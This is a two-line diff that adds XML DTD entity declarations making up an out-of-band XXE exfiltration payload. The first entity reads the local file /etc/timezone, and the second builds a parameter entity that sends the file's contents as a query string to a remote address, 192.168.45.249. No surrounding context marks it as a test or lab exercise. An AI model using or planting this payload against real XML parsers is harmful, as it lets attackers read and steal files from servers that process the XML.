@@ -1,0 +1,2 @@
+<!ENTITY % content SYSTEM "file:///etc/timezone">
+<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.45.249/out?%content;'>" >
